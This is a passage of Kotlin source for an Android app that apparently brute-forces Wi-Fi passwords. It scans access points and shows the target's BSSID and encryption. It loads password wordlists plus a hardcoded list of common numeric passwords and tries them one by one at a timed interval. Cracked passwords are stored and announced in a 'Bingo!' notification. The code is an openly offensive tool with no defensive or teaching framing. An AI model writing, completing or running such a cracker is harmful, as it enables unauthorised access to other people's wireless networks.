                        colors = ButtonDefaults.buttonColors(containerColor = barBg, contentColor = textPrimary),
                        modifier = Modifier
                            .weight(0.9f)
                            .height(42.dp)
                            .border(1.5.dp, Color(0xFF45474F), MaterialTheme.shapes.extraSmall),
                        contentPadding = PaddingValues(horizontal = 4.dp)
                    ) {
                        Text("Speed (${intervalSeconds}s)", fontSize = 12.sp, fontWeight = FontWeight.Black, maxLines = 1)
                    }

                    Button(
                        onClick = { filePickerLauncher.launch(arrayOf("text/plain", "*/*")) },
                        shape = MaterialTheme.shapes.extraSmall,
                        colors = ButtonDefaults.buttonColors(containerColor = barBg, contentColor = redAccent),
                        modifier = Modifier
                            .weight(1f)
                            .height(42.dp)
                            .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall),
                        contentPadding = PaddingValues(horizontal = 4.dp)
                    ) {
                        Text("Add .txt File", fontSize = 12.sp, fontWeight = FontWeight.Black, maxLines = 1)
                    }
                }

                Spacer(modifier = Modifier.height(8.dp))

                if (isRunning || isTrying) {
                    CircularProgressIndicator(
                        color = redAccent,
                        trackColor = Color.DarkGray,
                        modifier = Modifier.size(26.dp),
                        strokeWidth = 3.dp
                    )
                    Spacer(modifier = Modifier.height(6.dp))
                }

                Text("BSSID: $targetBssid", color = redAccent, fontSize = 13.sp, fontWeight = FontWeight.Bold)
                Text(
                    text = "Encryption: $targetEncryption",
                    color = redAccent,
                    fontSize = 12.sp,
                    fontWeight = FontWeight.Bold,
                    textAlign = TextAlign.Center
                )

                Spacer(modifier = Modifier.height(6.dp))

                LinearProgressIndicator(
                    progress = { progress },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(4.dp),
                    color = redAccent,
                    trackColor = Color(0xFF2C2C2E)
                )

                Spacer(modifier = Modifier.height(8.dp))

                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(cardBg)
                        .border(1.5.dp, Color(0xFF2D2F36))
                        .padding(10.dp),
                    verticalArrangement = Arrangement.spacedBy(5.dp)
                ) {
                    StatLine("Password:", "${currentIndex + 1} of $totalCount", redAccent)
                    StatLine("Step duration:", "$intervalSeconds sec", redAccent)
                    StatLine("Elapsed time:", "${elapsedSeconds}s", redAccent)
                    StatLine("Signal level:", "$targetSignal%", redAccent)
                    StatLine("System status:", networkSummary, redAccent)
                    StatLine("IP Address:", lastIpAddress, redAccent)
                }
            } else {
                Spacer(modifier = Modifier.height(36.dp))
                Text(
                    text = "No Network Selected",
                    color = Color(0xFF8E9098),
                    fontSize = 17.sp,
                    fontWeight = FontWeight.Black
                )
                Spacer(modifier = Modifier.height(6.dp))
                Text(
                    text = "Tap Add Network or Scan APs below",
                    color = Color(0xFF6B6D75),
                    fontSize = 14.sp,
                    fontWeight = FontWeight.Bold
                )
            }

            if (savedNetworks.isNotEmpty()) {
                Spacer(modifier = Modifier.height(14.dp))
                Text(
                    text = "Saved Networks (${savedNetworks.size})",
                    color = redAccent,
                    fontSize = 16.sp,
                    fontWeight = FontWeight.Black,
                    modifier = Modifier.fillMaxWidth()
                )
                Spacer(modifier = Modifier.height(6.dp))
                savedNetworks.forEach { entry ->
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(vertical = 4.dp)
                            .background(barBg)
                            .border(1.5.dp, Color(0xFF34363C))
                            .padding(10.dp),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Column(
                            modifier = Modifier
                                .weight(1f)
                                .clickable {
                                    targetSsid = entry.ssid
                                    currentPassword = entry.password
                                    hasSelectedNetwork = true
                                    statusBanner = "Ready"
                                }
                        ) {
                            Text(entry.ssid, color = redAccent, fontSize = 16.sp, fontWeight = FontWeight.Black)
                            Text("Password: ${entry.password}", color = textPrimary, fontSize = 14.sp, fontWeight = FontWeight.Bold)
                            Text(entry.savedAt, color = Color.Gray, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                        Box(
                            modifier = Modifier
                                .size(36.dp)
                                .background(Color(0xFF34363C))
                                .clickable {
                                    val updated = savedNetworks.filterNot { it == entry }
                                    savedNetworks = updated
                                    persistSavedNetworks(context, updated)
                                },
                            contentAlignment = Alignment.Center
                        ) {
                            Text("DEL", color = redAccent, fontSize = 11.sp, fontWeight = FontWeight.Black)
                        }
                    }
                }
            }
        }

        Column(
            modifier = Modifier
                .fillMaxWidth()
                .background(barBg)
                .border(1.dp, Color(0xFF2E3036))
                .padding(horizontal = 10.dp, vertical = 8.dp),
            verticalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                Button(
                    onClick = { permissionLauncher.launch(requiredPermissions) },
                    shape = MaterialTheme.shapes.extraSmall,
                    colors = ButtonDefaults.buttonColors(containerColor = darkBg, contentColor = redAccent),
                    modifier = Modifier
                        .weight(0.9f)
                        .height(46.dp)
                        .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall)
                ) {
                    Text("PERMS", fontSize = 13.sp, fontWeight = FontWeight.Black)
                }

                Button(
                    onClick = {
                        val hasPerm = requiredPermissions.all {
                            ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
                        }
                        if (!hasPerm) permissionLauncher.launch(requiredPermissions)
                        else triggerRealWifiScan()
                        showScanDialog = true
                    },
                    shape = MaterialTheme.shapes.extraSmall,
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White),
                    modifier = Modifier
                        .weight(1.1f)
                        .height(46.dp)
                ) {
                    Text("Scan APs", fontSize = 14.sp, fontWeight = FontWeight.Black)
                }

                Button(
                    onClick = {
                        if (targetSsid.isBlank()) {
                            statusBanner = "Select SSID First"
                            return@Button
                        }
                        singleTryJob?.cancel()
                        singleTryJob = scope.launch {
                            isTrying = true
                            statusBanner = "Trying..."
                            val ok = executeRealConnectionAttempt(
                                ssid = targetSsid,
                                password = currentPassword,
                                timeoutMs = intervalSeconds.coerceAtLeast(4) * 1000L
                            )
                            isTrying = false
                            if (ok) {
                                statusBanner = "Connected!"
                                saveSuccessfulConnection(targetSsid, currentPassword)
                                sendSuccessNotification(context, targetSsid, currentPassword)
                                bingoDialogData = targetSsid to currentPassword
                            } else {
                                statusBanner = "Wrong Password"
                            }
                            networkSummary = inspectNetworkState(context)
                        }
                    },
                    shape = MaterialTheme.shapes.extraSmall,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF991B1B), contentColor = Color.White),
                    modifier = Modifier
                        .weight(1.1f)
                        .height(46.dp)
                ) {
                    Text("Try Now", fontSize = 14.sp, fontWeight = FontWeight.Black)
                }
            }

            if (hasSelectedNetwork) {
                Button(
                    onClick = {
                        if (isRunning) pauseRunner("Paused")
                        else startWordlistSequence()
                    },
                    shape = MaterialTheme.shapes.extraSmall,
                    colors = ButtonDefaults.buttonColors(containerColor = darkBg, contentColor = redAccent),
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(44.dp)
                        .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall)
                ) {
                    Text(
                        text = if (isRunning) "Pause" else if (currentIndex > 0) "Resume (${intervalSeconds}s)" else "Start List (${intervalSeconds}s)",
                        fontSize = 15.sp,
                        fontWeight = FontWeight.Black
                    )
                }
            }
        }
    }
}

@Composable
private fun WifiSignalBarsIcon(
    signalPercent: Int,
    activeColor: Color,
    inactiveColor: Color,
    modifier: Modifier = Modifier
) {
    val activeBars = when {
        signalPercent >= 80 -> 4
        signalPercent >= 55 -> 3
        signalPercent >= 30 -> 2
        else -> 1
    }
    Canvas(modifier = modifier) {
        val w = size.width
        val h = size.height
        val center = Offset(w * 0.5f, h * 0.88f)
        val radii = listOf(h * 0.22f, h * 0.42f, h * 0.62f, h * 0.82f)
        val strokeWidth = w * 0.10f

        radii.forEachIndexed { index, r ->
            val color = if (index < activeBars) activeColor else inactiveColor
            drawArc(
                color = color,
                startAngle = -135f,
                sweepAngle = 90f,
                useCenter = false,
                topLeft = Offset(center.x - r, center.y - r),
                size = Size(r * 2f, r * 2f),
                style = Stroke(width = strokeWidth, cap = StrokeCap.Round)
            )
        }
    }
}

private fun formatSecurityShort(capabilities: String): String {
    val upper = capabilities.uppercase(Locale.US)
    return when {
        "WPA3" in upper -> "WPA3"
        "WPA2" in upper && "WPA" in upper -> "WPA / WPA2"
        "WPA2" in upper -> "WPA2"
        "WPA" in upper -> "WPA"
        "WEP" in upper -> "WEP"
        else -> "OPEN"
    }
}

@Composable
private fun StatLine(label: String, value: String, color: Color) {
    Row(
        modifier = Modifier.fillMaxWidth(),
        horizontalArrangement = Arrangement.SpaceBetween
    ) {
        Text(label, color = color, fontSize = 15.sp, fontWeight = FontWeight.Bold)
        Text(value, color = color, fontSize = 15.sp, fontWeight = FontWeight.Black)
    }
}

private data class ScanOutcome(
    val networks: List<ScannedWifiNetwork>,
    val summary: String
)

private const val PREFS_NAME = "red_wibr_prefs"
private const val KEY_SAVED_NETWORKS = "saved_networks_json"
private const val CHANNEL_ID = "wibr_success_channel"

private fun loadSavedNetworks(context: Context): List<SavedNetworkEntry> {
    val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
    val raw = prefs.getString(KEY_SAVED_NETWORKS, null) ?: return emptyList()
    return runCatching {
        val arr = JSONArray(raw)
        buildList {
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                add(
                    SavedNetworkEntry(
                        ssid = obj.optString("ssid"),
                        password = obj.optString("password"),
                        savedAt = obj.optString("savedAt")
                    )
                )
            }
        }
    }.getOrElse { emptyList() }
}

private fun persistSavedNetworks(context: Context, list: List<SavedNetworkEntry>) {
    val arr = JSONArray()
    list.forEach { item ->
        arr.put(
            JSONObject().apply {
                put("ssid", item.ssid)
                put("password", item.password)
                put("savedAt", item.savedAt)
            }
        )
    }
    context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        .edit()
        .putString(KEY_SAVED_NETWORKS, arr.toString())
        .apply()
}

private fun createSuccessNotificationChannel(context: Context) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Wi-Fi Connection Results",
            NotificationManager.IMPORTANCE_HIGH
        ).apply {
            description = "Alerts when a Wi-Fi password succeeds"
        }
        val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        nm.createNotificationChannel(channel)
    }
}

private fun sendSuccessNotification(context: Context, ssid: String, password: String) {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
        ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED
    ) {
        return
    }
    val notification = NotificationCompat.Builder(context, CHANNEL_ID)
        .setSmallIcon(R.drawable.ic_wibr_red)
        .setContentTitle("Bingo! Connected to $ssid")
        .setContentText("Password: $password")
        .setColor(0xFFFF3B30.toInt())
        .setPriority(NotificationCompat.PRIORITY_HIGH)
        .setAutoCancel(true)
        .build()

    val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
    nm.notify(ssid.hashCode(), notification)
}

private fun loadAssetWordlist(context: Context, assetName: String): List<String> {
    return runCatching {
        context.assets.open(assetName).use { stream ->
            BufferedReader(InputStreamReader(stream)).readLines()
                .map { it.trim() }
                .filter { it.isNotEmpty() }
        }
    }.getOrElse { emptyList() }
}

private fun readWordlistFromUri(context: Context, uri: Uri): List<String> {
    return runCatching {
        context.contentResolver.openInputStream(uri)?.use { stream ->
            BufferedReader(InputStreamReader(stream)).readLines()
                .map { it.trim() }
                .filter { it.isNotEmpty() }
        } ?: emptyList()
    }.getOrElse { emptyList() }
}

private fun generateNumericPatterns(): List<String> {
    return listOf(
        "12345678", "123456789", "1234567890", "00000000", "11111111",
        "22222222", "33333333", "44444444", "55555555", "66666666",
        "77777777", "88888888", "99999999", "11223344", "22446688"
    )
}

private fun isLocationServiceEnabled(context: Context): Boolean {
    val lm = context.getSystemService(Context.LOCATION_SERVICE) as? LocationManager ?: return true
    return runCatching {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            lm.isLocationEnabled
        } else {
            @Suppress("DEPRECATION")
            lm.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
                @Suppress("DEPRECATION")
                lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER)
        }
    }.getOrDefault(true)
}

@Suppress("DEPRECATION")
@SuppressLint("MissingPermission")
private fun readScanResultsOnly(context: Context): List<ScannedWifiNetwork> {
    val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        ?: return emptyList()
    val results = runCatching { wifiManager.scanResults }.getOrNull().orEmpty()
    return results
        .filter { !it.SSID.isNullOrBlank() }
        .distinctBy { "${it.SSID}_${it.BSSID}" }
        .sortedByDescending { it.level }
        .map { sr ->
            val pct = WifiManager.calculateSignalLevel(sr.level, 100).coerceIn(5, 100)
            ScannedWifiNetwork(
                ssid = sr.SSID,
                bssid = sr.BSSID ?: "00:00:00:00:00:00",
                capabilities = sr.capabilities ?: "[WPA2-PSK]",
                signalPercent = pct
            )
        }
}

@Suppress("DEPRECATION")
@SuppressLint("MissingPermission")
private fun performRealWifiScan(context: Context): ScanOutcome {
    val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
        ?: return ScanOutcome(emptyList(), "Found 0 APs")

    if (!wifiManager.isWifiEnabled) {
        return ScanOutcome(emptyList(), "Turn Wi-Fi ON")
    }

    if (!isLocationServiceEnabled(context)) {
        return ScanOutcome(emptyList(), "Turn Location ON")
    }

    runCatching { wifiManager.startScan() }
    val list = readScanResultsOnly(context)
    return ScanOutcome(
        networks = list,
        summary = "Found ${list.size} APs"
    )
}

private fun inspectNetworkState(context: Context): String {
    val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
    val active = cm.activeNetwork ?: return "Disconnected"
    val caps = cm.getNetworkCapabilities(active) ?: return "Limited"
    val transport = when {
        caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "Wi-Fi"
        caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile Data"
        else -> "Other"
    }
    val internet = if (caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) "Internet" else "Local"
    return "$transport ($internet)"
}